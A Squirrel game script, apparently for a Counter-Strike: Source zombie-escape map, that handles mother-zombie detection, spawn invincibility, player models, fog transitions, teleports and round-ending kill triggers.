			local msg = "\x07FF3F3F[ITEM] \x05"+pc.name+" \x01was not allowed to pick up Z-item '\x03"+name+"\x01' due to suspected inflating";
			printl(msg);
			::ServerSay("say "+msg,0.00,null);
		}
	}
	return false;
}

TickPlayerCheapModels_rate <- 3.00;
TickPlayerCheapModels_hplimit <- 1002;
function TickPlayerCheapModels()
{
	if(!::CHEAP_PLAYERMODELS)return;
	EntFireByHandle(self,"RunScriptCode"," TickPlayerCheapModels(); ",TickPlayerCheapModels_rate,null,null);
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid()||h.GetTeam()!=2||h.GetHealth()<TickPlayerCheapModels_hplimit)continue;
		if(h.GetModelName()!="models/player/custom_player/luffaren/playercheap_t.mdl")
		{
			h.ValidateScriptScope();
			if("impostor_active" in h.GetScriptScope())continue;
			//::manager.PrecacheModel("models/player/custom_player/luffaren/playercheap_t.mdl");
			h.SetModel("models/player/custom_player/luffaren/playercheap_t.mdl");
			::SetColor(h,255,255,255,255);	//__CSS__ css4
		}
	}
}

EntFireByHandle(::manager,"RunScriptCode"," TickDelay(); ",5.00,null,null);
::MOTHER_ZOMBIE_SPAWNED <- false;
::MOTHER_ZOMBIE_NOTSPAWNED <- false;
::MOTHER_ZOMBIES <- [];
::MOTHER_ZOMBIES_SIDS <- [];		//__CSS__ remember those who crash/rejoin
::IsMotherZombie <- function(player)
{
	if(player==null||!player.IsValid())return false;
	foreach(mz in ::MOTHER_ZOMBIES){
		if(mz==player)
			return true;
	}
	
	//__CSS__ remember those who crash/rejoin
	local sid = ::GetPlayerSteamID(player);
	if(sid=="")return false;
	foreach(mz in ::MOTHER_ZOMBIES_SIDS){
		if(mz==sid)
			return true;
	}
	
	return false;
}
function MotherZombieFound(actually_found=true)	//the moment when the mother zombie(s) spawn in (all mz playerhandles are in ::MOTHER_ZOMBIES)
{
	if(::MOTHER_ZOMBIE_SPAWNED)return;
	::MOTHER_ZOMBIE_SPAWNED = true;
	if(!actually_found)::MOTHER_ZOMBIE_NOTSPAWNED = true;
	EntFire("manager","RunScriptCode"," ::ANTI_ITEM_INFLATE_ACTIVE = false; ",::ANTI_ITEM_INFLATE_TIME,null);
	EntFire("tele_spawninit","Disable","",0.00,null);
	EntFire("tele_spawn","Enable","",0.05,null);
	EntFire("patronstuff","Kill","",0.00,null);
	if(::kill_afks_on_mz)
	{
		EntFire("afk_killer","Enable","",0.10,null);
		EntFire("afk_killer","Kill","",0.50,null);
	}
	else EntFire("afk_killer","Kill","",0.00,null);
	EntFireByHandle(self,"RunScriptCode"," TickZombieInvincibility(); ",0.10,null,null);
	if(::CHEAP_PLAYERMODELS)
	{
		EntFireByHandle(self,"RunScriptCode"," TickPlayerCheapModels(); ",0.50,null,null);
		::EventListener("player_death",{function EventFired(name,data){
			if(data.attacker==0)return;//world
			{
				local pc = ::GetPlayerClass(data.userid);
				if(pc==null)return;
				if(pc.handle==null||!pc.handle.IsValid())return;
				//::manager.PrecacheModel("models/player/custom_player/luffaren/playercheap_t.mdl");
				pc.handle.SetModel("models/player/custom_player/luffaren/playercheap_t.mdl");
				::SetColor(pc.handle,255,255,255,255);	//__CSS__ css4
				if(!::CHEAP_PLAYERMODELS_TINT)EntFireByHandle(pc.handle,"AddOutput","rendercolor 255 255 255",0.00,null,null);
			}}});
		foreach(p in ::MOTHER_ZOMBIES)
		{
			//::manager.PrecacheModel("models/player/custom_player/luffaren/playercheap_t.mdl");
			p.SetModel("models/player/custom_player/luffaren/playercheap_t.mdl");
			::SetColor(p,255,255,255,255);	//__CSS__ css4
			EntFireByHandle(p,"RunScriptCode"," self.SetModel(\"models/player/custom_player/luffaren/playercheap_t.mdl\"); ",0.50,null,null);
			if(!::CHEAP_PLAYERMODELS_TINT)EntFireByHandle(p,"AddOutput","rendercolor 255 255 255",0.00,null,null);
		}
	}
	::SendCustomEvent("mother_zombie_spawned",{actually_found=actually_found,motherzombies=::MOTHER_ZOMBIES});
}
::spawnarea_direction <- Vector(1,0,0);
function SpawnTeleRoundStart()	//when player(activator) get's teled from spawn (before MZ has been chosen), should always be humans probably (except JUST when mz gets picked)
{
	local toucher = activator;
	toucher.SetOrigin(Vector(toucher.GetOrigin().x,toucher.GetOrigin().y,4));
	toucher.SetVelocity(Vector());
	toucher.SetForwardVector(::spawnarea_direction);
	if(::CHEAP_PLAYERMODELS)
	{
		
		
		//::manager.PrecacheModel("models/player/custom_player/luffaren/playercheap_ct_nohitbox.mdl");
		
		//toucher.SetModel("models/player/custom_player/luffaren/playercheap_ct_nohitbox.mdl");		//__CSS__ removed model
		toucher.SetModel("models/player/custom_player/luffaren/playercheap_ct.mdl");
		::SetColor(toucher,255,255,255,255);	//__CSS__ css4
		
		
		if(!::CHEAP_PLAYERMODELS_TINT)EntFireByHandle(toucher,"AddOutput","rendercolor 255 255 255",0.00,null,null);
	}
	if(::MTEST)toucher.SetScriptOverlayMaterial("");
	else toucher.SetScriptOverlayMaterial(::mapimg_mat);
}
function SpawnTele()			//when player(activator) get's teled from spawn (after MZ has been chosen), should always be zombies probably
{
	local toucher = activator;
	EntFireByHandle(toucher,"RunScriptCode"," self.SetVelocity(Vector(RandomInt(-20,20),RandomInt(-50,50),0)); ",0.00,null,null);
	EntFireByHandle(toucher,"RunScriptCode"," self.SetVelocity(Vector(RandomInt(-20,20),RandomInt(-50,50),0)); ",0.05,null,null);
	EntFireByHandle(self,"RunScriptCode"," CheckZombieInvincibility(); ",0.00,toucher,null);
	if(::CHEAP_PLAYERMODELS && ::MOTHER_ZOMBIE_SPAWNED && toucher.GetTeam()==2)
	{
		//::manager.PrecacheModel("models/player/custom_player/luffaren/playercheap_t.mdl");
		toucher.SetModel("models/player/custom_player/luffaren/playercheap_t.mdl");
		::SetColor(toucher,255,255,255,255);	//__CSS__ css4
		if(!::CHEAP_PLAYERMODELS_TINT)EntFireByHandle(toucher,"AddOutput","rendercolor 255 255 255",0.00,null,null);
	}
	if(::MTEST)toucher.SetScriptOverlayMaterial("");
	else toucher.SetScriptOverlayMaterial(::mapimg_mat);
}

TickMotherZombieScan_RATE <- 0.05;
TickMotherZombieScan_found <- false;
function TickMotherZombieScan()
{
	if(TickMotherZombieScan_found)
	{
		MotherZombieFound();
		return;
	}
	EntFireByHandle(self,"RunScriptCode"," TickMotherZombieScan(); ",TickMotherZombieScan_RATE,null,null);
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())		//||h.GetTeam()!=2)		//NEW IN V1_9 - don't check team, just check HP
			continue;
		if(h.GetHealth() > 1004)	//mother zombie found!
		{
			TickMotherZombieScan_found = true;
			::MOTHER_ZOMBIES.push(h);
			::MOTHER_ZOMBIES_SIDS.push(::GetPlayerSteamID(h));
			continue;
		}
		//if(h.GetHealth()>0)break;								//NEW IN V1_9 - don't break here, check everyone properly
	}
}
EntFireByHandle(::manager,"RunScriptCode"," TickMotherZombieScan(); ",1.00,null,null);
EntFireByHandle(::manager,"RunScriptCode"," MotherZombieFound(false); ",30.00,null,null); //30s fallback/backup, in case there's no zombies, NAH it breaks shit, disable


TickZombieInvincibility_rate <- 0.50;		//how fast to tick-scan/process all zombies for the invincibility
TickZombieInvincibility_range <- 50;		//the range zombies have to be within the main teleporter to be invincible (the TP that moves around to each stage-start)
TickZombieInvincibility_range_spawn <- 500;	//the range zombies have to be within the spawn area invincible (Vector(0,0,0), only active while spawn exists)
TickZombieInvincibility_delay <- false;		//set this to 'true' to force zombie-invincibility (should be enabled when humans delay too long)
::TickZombieInvincibility_enabled <- true;	//set this to 'false' to force-remove invincibility (useful for certain endings, like HUNT)
::gametext_zinvincible <- null;
::gametext_zinvincible_delay <- null;
::gametext_zinvincible_channel <- 4;
::zinvincible_message <- false;
function TickZombieInvincibility()
{
	EntFireByHandle(self,"RunScriptCode"," TickZombieInvincibility(); ",TickZombieInvincibility_rate,null,null);
	if(!::MOTHER_ZOMBIE_SPAWNED)return;
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		if(h.GetTeam()==2)EntFireByHandle(self,"RunScriptCode"," CheckZombieInvincibility(); ",0.00,h,null);
		else if(h.GetTeam()==3)EntFireByHandle(self,"RunScriptCode"," CheckHumanDamageFilter(); ",0.00,h,null);
	}
}
function CheckHumanDamageFilter()
{
	if(activator==null||!activator.IsValid()||activator.GetTeam()!=3)return;
	activator.ValidateScriptScope();
	if("invinciblehuman" in activator.GetScriptScope())
		EntFireByHandle(activator,"SetDamageFilter","filter_t_no",0.00,null,null);				//invincible against all zombies
	else
		EntFireByHandle(activator,"SetDamageFilter","filter_safezombie",0.00,null,null);		//default: only invincible against zombies with 'safezombie' context
}
function CheckZombieInvincibility()
{
	if(activator==null||!activator.IsValid()||activator.GetTeam()!=2)return;
	activator.ValidateScriptScope();
	if("poise" in activator.GetScriptScope())
	{
		EntFireByHandle(activator,"SetDamageFilter","filter_ct_no",0.00,null,null);
		EntFireByHandle(activator,"AddContext","invincible:1",0.00,null,null);
		activator.GetScriptScope().invincible <- true;
		return;
	}
	if(!::TickZombieInvincibility_enabled)
	{
		EntFireByHandle(activator,"SetDamageFilter","",0.00,null,null);
		EntFireByHandle(activator,"RemoveContext","invincible",0.00,null,null);
		if("invincible" in activator.GetScriptScope())
			delete activator.GetScriptScope().invincible;
		return;
	}
	local set_invincibility = false;
	if(TickZombieInvincibility_delay)set_invincibility = true;
	else
	{
		local dist = ::GetDistance(::tpdest.GetOrigin(),activator.GetOrigin());
		if(dist < TickZombieInvincibility_range || TickZombieInvincibility_delay)set_invincibility = true;
		else if(!spawnplatform_killed)
		{
			dist = ::GetDistance(Vector(),activator.GetOrigin());
			if(dist < TickZombieInvincibility_range_spawn)set_invincibility = true;
		}
	}
	if(set_invincibility)
	{
		EntFireByHandle(activator,"SetDamageFilter","filter_ct_no",0.00,null,null);
		EntFireByHandle(activator,"AddContext","invincible:1",0.00,null,null);
		activator.GetScriptScope().invincible <- true;
		if(!TickZombieInvincibility_delay)
			EntFireByHandle(::gametext_zinvincible,"Display","",0.00,activator,null);
		else
			EntFireByHandle(::gametext_zinvincible_delay,"Display","",0.00,activator,null);
	}
	else
	{
		EntFireByHandle(activator,"SetDamageFilter","",0.00,null,null);
		EntFireByHandle(activator,"RemoveContext","invincible",0.00,null,null);
		if("invincible" in activator.GetScriptScope())
			delete activator.GetScriptScope().invincible;
	}
}
::gametext_zinvincible = Entities.CreateByClassname("game_text");
	//OLD:
//::gametext_zinvincible.__KeyValueFromString("message","[INVINCIBLE]\nYou are within "+TickZombieInvincibility_range.tostring()+" units from the start-teleport\n"+
//											"You are therefore invincible against humans\n(until walking outside the teleport-range)");



::gametext_zinvincible.__KeyValueFromString("message","[INVINCIBLE]\nStart area\n");
	//__CSS__ og below, new above
//::gametext_zinvincible.__KeyValueFromString("message","[INVINCIBLE]\nYou are within the start area\n"+
//											"You are therefore invincible against humans\n(until walking further away)");
											

::gametext_zinvincible.__KeyValueFromFloat("x",0.135);		//__CSS__ og csgo was -1
::gametext_zinvincible.__KeyValueFromFloat("y",0.145);		//__CSS__ og csgo was 0.40
::gametext_zinvincible.__KeyValueFromFloat("fadein",0.00);
::gametext_zinvincible.__KeyValueFromFloat("fadeout",0.00);
::gametext_zinvincible.__KeyValueFromFloat("holdtime",TickZombieInvincibility_rate+0.20);
::gametext_zinvincible.__KeyValueFromInt("channel",::gametext_zinvincible_channel);
::gametext_zinvincible.__KeyValueFromInt("effect",0);
::gametext_zinvincible.__KeyValueFromVector("color",Vector(255,200,0));

::gametext_zinvincible_delay = Entities.CreateByClassname("game_text");


::gametext_zinvincible_delay.__KeyValueFromString("message","[INVINCIBLE]\nHumans delaying");
	//__CSS__ og below, new above
//::gametext_zinvincible_delay.__KeyValueFromString("message","[INVINCIBLE]\nThe humans are taking too long to progress\n"+
//											"You are therefore invincible against humans\n(until progression is made)");
											

::gametext_zinvincible_delay.__KeyValueFromFloat("x",0.135);	//__CSS__ og csgo was -1
::gametext_zinvincible_delay.__KeyValueFromFloat("y",0.145);	//__CSS__ og csgo was 0.40
::gametext_zinvincible_delay.__KeyValueFromFloat("fadein",0.00);
::gametext_zinvincible_delay.__KeyValueFromFloat("fadeout",0.00);
::gametext_zinvincible_delay.__KeyValueFromFloat("holdtime",TickZombieInvincibility_rate+0.20);
::gametext_zinvincible_delay.__KeyValueFromInt("channel",::gametext_zinvincible_channel);
::gametext_zinvincible_delay.__KeyValueFromInt("effect",0);
::gametext_zinvincible_delay.__KeyValueFromVector("color",Vector(255,200,0));
::ScrambleArray <- function(arr)
{
	if(arr==null||arr.len()<=0)return [];
	local scrambled = false;
	local arr_scrambled = [];
	while(!scrambled)
	{
		local arrindex = RandomInt(0,arr.len()-1);
		arr_scrambled.push(arr[arrindex]);
		arr.remove(arrindex);
		if(arr.len()<=0)scrambled = true;
	}
	return arr_scrambled;
}
function SpawnVauff()
{
	if(::finale_started && !::colletivebosslogo_shown)return;	//NEW in v1_7 - disallow it from spawning during early finale (allows it again once boss starts)
	local exists = Entities.FindByName(null,"i_vauffworldeater*");
	if(exists==null||!exists.IsValid()){}else return;
	local maker = Entities.FindByName(null,"s_vauffworldeater_maker");
	local spawnpos = pos+Vector(0,0,::VAUFFWORLDEATER_SPAWNHEIGHT);
	if(spawnpos.z > 16000)spawnpos.z = 16000;
	maker.SpawnEntityAtLocation(spawnpos,Vector());
	::ServerSay("say You're feeling watched...",10.00,null);
	::ServerSay("say Something is coming for you...",30.00,null);
	::ServerSay("say You sense a looming presence above you...",50.00,null);
}
::fog_handle <- null;
fog_color <- Vector(255,255,255);
fog_color_target <- Vector(255,255,255);
fog_dist_start <- 1000.00;
fog_dist_start_target <- 1000.00;
fog_dist_end <- 100000.00;
fog_dist_end_target <- 100000.00;
fog_density <- 1.00;
fog_density_target <- 1.00;
fog_farz <- 2000000.00;			//was 300000 globally before v1_6 (the nature theme treetop brambles needed 600000)		//__CSS__ 600000 og
fog_farz_target <- 2000000.00;
		fog_finale_color <- Vector(0,0,0);
		fog_finale_start <- -500;
		fog_finale_end <- 3000;
		fog_finale_density <- 0.70;
		fog_finale_farz <- 2000000;
	fog_speedmultiplier <- 1.00;			//global speed multiplier for fog fading speed
	fog_bufferdist <- 1.00;
	fog_randomizer <- false;				//set this to true to randomize fogs all willy nilly over time
	fog_randomizer_holdtime_min <- 0.10;
	fog_randomizer_holdtime_max <- 60.00;
function TickFog()
{
	local tick_called = false;
	try{
		local r = fog_color.x;
		local g = fog_color.y;
		local b = fog_color.z;
		local start = fog_dist_start;
		local end = fog_dist_end;
		local density = fog_density;
		local farz = fog_farz;
			local pend = 0;
			local dvel=0.01;
			local d=0.00;
				//d=(0.00+(xxxxx_target_xxxxx - HHHHH));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};HHHHH+=d;
				//if(HHHHH>255)HHHHH=255;else if(HHHHH<0)HHHHH=0;
		d=(0.00+(fog_color_target.x - r));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};r+=d;
		if(r>255)r=255;else if(r<0)r=0;
			d=(0.00+(fog_color_target.y - g));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};g+=d;
			if(g>255)g=255;else if(g<0)g=0;
		d=(0.00+(fog_color_target.z - b));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};b+=d;
		if(b>255)b=255;else if(b<0)b=0;
			d=(0.00+(fog_dist_start_target - start));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};start+=d;
		d=(0.00+(fog_dist_end_target - end));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};end+=d;
			if(fog_density_target>1.00)fog_density_target=1.00;else if(fog_density_target<0.00)fog_density_target=0.00;
			d=(0.00+(fog_density_target - density));if(fabs(d)>0.02){d*=(dvel*fog_speedmultiplier);pend++;};density+=d;
			if(density>1.00)density=1.00;else if(density<0.00)density=0.00;
		d=(0.00+(fog_farz_target - farz));if(fabs(d)>fog_bufferdist){d*=(dvel*fog_speedmultiplier);pend++;};farz+=d;
			if(::fog_handle==null||!::fog_handle.IsValid())::fog_handle=Entities.FindByName(null,"fog");
			
			local setcol = Vector(r,g,b);
			local color = (setcol.z.tointeger() << 16) | (setcol.y.tointeger() << 8) | setcol.x.tointeger();
			::NetProps.SetPropInt(Entities.FindByClassname(null,"env_fog_controller"),"m_fog.colorPrimary",color);
			//::fog_handle.__KeyValueFromVector("fogcolor",Vector(r,g,b));		//__CSS__ fog colors updated via netprops now
			
			::fog_handle.__KeyValueFromInt("fogstart",start);
			::fog_handle.__KeyValueFromInt("fogend",end);
			::fog_handle.__KeyValueFromFloat("fogmaxdensity",density);
			::fog_handle.__KeyValueFromInt("farz",farz);
		fog_color.x = r;
		fog_color.y = g;
		fog_color.z = b;
		fog_dist_start = start;
		fog_dist_end = end;
		fog_density = density;
		fog_farz = farz;
			tick_called = true;
			if(pend>0)EntFireByHandle(self,"RunScriptCode"," TickFog(); ",0.01,null,null);
			else if(fog_randomizer)
			{
				EntFireByHandle(self,"RunScriptCode"," TickFog(); ",RandomFloat(fog_randomizer_holdtime_min,fog_randomizer_holdtime_max),null,null);
				fog_color_target = Vector(RandomInt(0,255),RandomInt(0,255),RandomInt(0,255));
				local randstart = RandomInt(0,10000);
				fog_dist_start_target = RandomInt(-10000,randstart);
				fog_dist_end_target = RandomInt(randstart+10,100000);
				fog_density_target = RandomFloat(0.00,1.00);
				fog_farz_target = RandomInt(100000,100000);
			}
			else EntFireByHandle(self,"RunScriptCode"," TickFog(); ",1.00,null,null);
	}catch(e){printl("[fog error]: "+e);}
	if(!tick_called)EntFireByHandle(self,"RunScriptCode"," TickFog(); ",0.01,null,null);
}
EntFireByHandle(::manager,"RunScriptCode"," TickFog(); ",0.20,null,null);
::tpdest <- null;
//function MoveTP(){newthread(_MoveTP.bindenv(this)).call();}		//NEW IN V1_9		//__CSS__ threading_disabled
function MoveTP(){_MoveTP();}		//NEW IN V1_9
function _MoveTP()
{
	if(::TPmovequeue.len()<=0)return;
	::TPenableindex++;
	
	//if(::TPenableindex<2)return;						//OLD
	if(::TPenableindex<=MAX_AREA_HISTORY)return;		//NEW
	if(::finale_started && ::TPenableindex<3 && !::finale_escape_tpmove_2_3)return;
	::tpdest.ValidateScriptScope();
	::tpdest.GetScriptScope().setorg <- ::TPmovequeue[0];
	::TPmovequeue.remove(0);
	::tpdest.GetScriptScope().setang <- ::TPmovequeue[0];
	::TPmovequeue.remove(0);
	::tpdest.GetScriptScope().SetNewTP <- function(){
			self.SetOrigin(setorg);
			self.SetAngles(setang.x,setang.y,setang.z);};
	if(::finale_endrun_started && mapspawnindex >= (::finale_escape_levelamount) && ::finale_escape_tpmove_2_3){}
	else
	{
		EntFireByHandle(::tpdest,"RunScriptCode"," SetNewTP(); ",TP_DELAY,null,null);
		EntFire("tpdest_indicator","RunScriptCode"," RunEnable(); ",TP_DELAY,null);
	}
	EntFire("spawnplatform","FireUser1","",AREAFADE_DELAY+4.80,null);
	EntFire("temcleaner_*","FireUser1","",AREAFADE_DELAY+4.80,null);
	EntFire("block_"+(0+mapspawnindex-1).tostring()+"_endindicator","FireUser1","",AREAFADE_DELAY+4.80,null);
	local blockfound = Entities.FindByName(null,"block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*");
	if(blockfound==null)return;
	local ii = 0.00+AREAFADE_DELAY;
	EntFire("block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*","AddOutput","rendermode 9",ii,null);		//new in v1_7
	if(::DESPAWNFADE_FX)
	{
		for(local alpha=255;alpha>3;alpha-=AREAFADE_SPEED){
			EntFire("block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*","AddOutput","renderamt "+alpha,ii,null);
			ii += AREAFADE_SPEEDT;}
	}
	else
	{
		for(local alpha=255;alpha>3;alpha-=AREAFADE_SPEED){ii += AREAFADE_SPEEDT;}
		EntFire("block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*","AddOutput","renderamt "+::DESPAWNFADE_FALSESET.tostring(),0.00,null);
	}
	EntFire("airslide_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring(),"Disable","",ii,null);
	EntFire("lowgrav_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring(),"Disable","",ii,null);
	EntFire("block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*","Kill","",ii+0.05,null);
	if(::EXITFADE_PHYSENABLED)
	{
		local bpieces = [];
		local blockpieces = [];
		for(local h;h=Entities.FindByName(h,"block_"+(-MAX_AREA_HISTORY + ::TPenableindex).tostring()+"*");){bpieces.push(h);}
		foreach(h in bpieces){blockpieces.push(bpieces[RandomInt(0,bpieces.len()-1)]);}
		local ilim = 100;
		if(blockpieces.len()<=100)ilim = (blockpieces.len()-5);
		if(ilim <= 0)ilim=0;
		for(local i=0;i<ilim;i++){blockpieces.remove(RandomInt(0,blockpieces.len()-1));}
		local ii = 0.00+(AREAFADE_DELAY*0.10);
		foreach(h in blockpieces)
		{
			
			//::CollapseTile();  //not needed it seems, this is never ran without ::EXITFADE_PHYSENABLED
			EntFireByHandle(h,"EnableMotion","",ii+0.02,null,null);
			EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",ii,null,null);
			
			
			ii += RandomFloat(0.02,0.20);
		}
	}
}

EntFire("*","DisableShadow","",0.10,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",0.50,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",1.00,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",1.50,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",2.00,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",2.50,null);	//__CSS__ what the fuck doesn't kv's do shit for?
EntFire("*","DisableShadow","",3.00,null);	//__CSS__ what the fuck doesn't kv's do shit for?


EntFire("spawninfoboard","AddOutput","rendermode 0",0.00,null);	//__CSS__ og was 2
EntFire("buyzone","AddOutput","origin 0 0 0",0.00,null);
EntFire("buyzone","AddOutput","origin 0 0 0",1.00,null);
spawnplatform_killed <- false;
function SpawnPlatformKill()
{
	spawnplatform_killed = true;
	EntFire("buyzone","AddOutput","origin 0 0 -18000",0.00,null);
	EntFire("spawnplatform","EnableMotion","",0.05,null);
	EntFire("spawnplatform","Wake","",0.10,null);
	EntFire("spawnplatform_fallhelper","Kill","",1.00,null);
	EntFire("spawnplatform","Wake","",1.05,null);
	EntFire("spawninfoboard","AddOutput","rendermode 3",0.00,null);		//__CSS__ og was 2
	local fh = Entities.FindByName(null,"spawnplatform_fallhelper");
	fh.SetOrigin(Vector(0,0,-80)+(::AnglesToDir(Vector(0,RandomInt(0,360),0))*RandomInt(0,500)));
	local ii = 5.00;
	EntFire("spawnplatform","AddOutput","rendermode 2",ii,null);
	for(local alpha=255;alpha>0;alpha-=5)
	{
		ii += 0.05;
		EntFire("spawnplatform","AddOutput","renderamt "+alpha.tostring(),ii,null);
		EntFire("spawninfoboard","AddOutput","renderamt "+alpha.tostring(),ii,null);
	}
	EntFire("spawnplatform","Kill","",ii+0.10,null);
}


//__CSS__ - some of these won't work, and will actually crash the game
function SetPrecipitation(index)	//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none		__CSS__:rainstorm is now snowstorm
{
	//__CSS__ precipitation is **fucked** in CSS, do not do anything with this
	//---- 1) crashes after a few seconds ("too many indices - tell a programmer")
	//---- 2) snows for a bit, then just stops
	//---- 3) pink/missing sprite materials
	//---- 4) pink/missing sprite materials
	EntFire("precipitation_*","Kill","",0.00,null);
	return;
	
	
	if(!::PRECIPITATION_ENABLED)return;
	::PRECIPITATION = index;
	if(::PRECIPITATION==0)
	{
		EntFire("precipitation_*","Kill","",0.00,null);
		::lastprecipitation = 0;
		return;
	}
	if(::PRECIPITATION==3)::PRECIPITATION=4;	//snow seems to cause FPS drops way more harshly
	if(::PRECIPITATION != ::lastprecipitation)
	{
		EntFire("precipitation_*","Kill","",0.00,null);
		::lastprecipitation = (0+::PRECIPITATION);
		EntFire("template_precipitation","ForceSpawn","",0.05,null);
		return;
	}
}
function DisableTPdestIndicator()
{
	EntFire("tpdest_indicator","RunScriptCode"," enabled = true; ",0.00,null);
	EntFire("tpdest_indicator","AddOutput","glowenabled 0",0.00,null);
	EntFire("tpdest_indicator","AddOutput","glowdist 0",0.00,null);
	EntFire("tpdest_indicator","Disable","",0.00,null);
	EntFire("tpdest_indicator","AddOutput","glowenabled 0",0.05,null);
	EntFire("tpdest_indicator","AddOutput","glowdist 0",0.05,null);
	EntFire("tpdest_indicator","Disable","",0.05,null);
}
function TouchAfkTrigger()	//triggers for CT's in spawn when MZ/afk-trigger enables (as 'activator')
{
	if(activator==null||!activator.IsValid()||activator.GetTeam()!=3||activator.IsAlive()==false)return;
	if(::AFK_RESPONSE==1)
		EntFireByHandle(activator,"SetHealth","-1",0.00,null,null);
	else
	{
		if(::finale_started)		//don't TP too far ahead if '3' is set, could get stuck...
		{
			if(::AFK_RESPONSE==3)
			{
				activator.SetOrigin(Vector(0,0,4)+(::spawnarea_direction*(470)));
			}
			return;
		}
		if(::AFK_RESPONSE==3)
		{
			activator.SetOrigin(Vector(0,0,4)+(::spawnarea_direction*(560+(BUFFER_SIZE_SPAWN*GRID_SIZE))));
			activator.SetVelocity(Vector());
			activator.SetForwardVector(::spawnarea_direction);
		}
	}
}
function TickSpawnKiller()		//__CSS__ workaround, seems like the damage hook kinda fiddled a bit here
{
	EntFire("manager","RunScriptCode","TickSpawnKiller();",0.02,null);
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h.IsAlive() && h.GetOrigin().z < -16000)
		{
			//::HurtPlayer(h,true);		//__CSS__ this prevents spawnkiller from running, instead we should be clearing damagefilters/safe shit to let the trigger_hurt kill them
			h.ValidateScriptScope();
			if("safezombie" in h.GetScriptScope())delete h.GetScriptScope().safezombie;
			h.AcceptInput("SetDamageFilter","",null,null);
		}
	}
}
spawnkiller_enabled <- false;
function EnableSpawnKiller(slay_flight_items=true)	//enables kill-hurt + disables teleport in spawn-blackroom (+ slay/kill flight-items, optional param to NOT do that)
{
	if(!spawnkiller_enabled)
	{
		spawnkiller_enabled = true;
		EntFire("manager","RunScriptCode","TickSpawnKiller();",0.00,null);
	}
	EntFire("tele_spawninit","Disable","",0.00,null);
	EntFire("tele_spawn","Disable","",0.00,null);
	EntFire("spawnkiller","Enable","",0.00,null);
	if(slay_flight_items)
	{
		EntFire("item_flight","RunScriptCode"," if(holder.GetMoveParent()!=null)EntFireByHandle(holder.GetMoveParent(),\"SetHealth\",\"-1\",0.00,null,null); ",0.05,null);
		EntFire("item_flight","Kill","",0.10,null);
		EntFire("manager","RunScriptCode"," ::ITEMS.flight.slay_enabled = true; ",0.15,null);
	}
	DisableTPdestIndicator();
}
function EnableMassKiller()									//runs EnableSpawnKiller^ + enables hurt covering map (except for players with targetname 'endsafeplayer')
{
	EnableSpawnKiller();
	EntFire("KILL_ALL","Enable","",0.04,null);
	for(local h;h=Entities.FindByClassname(h,"player");)//new in v1_6
	{
		if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
		if(h.GetName()=="endsafeplayer")continue;
		EntFireByHandle(h,"SetHealth","-1",0.00,null,null);
	}
}
function EnableMassKillerAll()								//runs EnableSpawnKiller^ + enables hurt covering map (which works against everyone, no matter targetname/filter)
{
	EnableSpawnKiller();
	EntFire("KILL_ALL_REAL","Enable","",0.04,null);
	for(local h;h=Entities.FindByClassname(h,"player");)//new in v1_6
	{
		if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
		EntFireByHandle(h,"SetHealth","-1",0.00,null,null);
	}
}

::MTEST<-false;
HTML_INDEX <- "0";
HTML_INDEX_mapname <- "";
HTML_INDEX_mirrored <- false;	//__CSS__ new
HTML_INDEX_authname <- "";
HTML_INDEX_idname <- "";
HTML_MAPNAME <- "";
html_print_foreverloop_enabled <- false;
html_print_foreverloop_rate <- 2.00;
function HTMLPRINT()
{
	//return; //__CSS__ this won't work in css, disable it
	if(noprint)return;
	if(::MTEST)return;
	if(!ENABLE_HTML_PRINT)return;
	if(HTML_PRINT_POSTDELAY <= 0.01)
		HTML_PRINT_POSTDELAY = 0.01;
	if(HTML_PRINT_HOLDTIME != null)
	{
		for(local i=(0.00+HTML_PRINT_POSTDELAY);i<HTML_PRINT_HOLDTIME;i+=(0.00+HTML_PRINT_POSTDELAY))
			{EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST(); ",i,null,null);}
		EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST(); ",0.00,null,null);
		EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST(); ",0.15,null,null);
	}
	else if(!html_print_foreverloop_enabled)
	{
		html_print_foreverloop_enabled = true;
		EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST_TICKFOREVER(); ",(0.00+HTML_PRINT_POSTDELAY),null,null);
	}
	//OLD - no longer usable, replaced by simply reading the image itself directly since v1_4:
	//ScriptPrintMessageCenterAll("<html><img src=\"http://luffaren.com/ze_collective.php?GetScaledImage="+HTML_MAPNAME+"\"/></html>");
}


::mapimgtext <- Entities.CreateByClassname("game_text");
::mapimgtext.__KeyValueFromInt("channel",1);
::mapimgtext.__KeyValueFromInt("spawnflags",1);
::mapimgtext.__KeyValueFromInt("effect",0);
::mapimgtext.__KeyValueFromFloat("x",0.135);
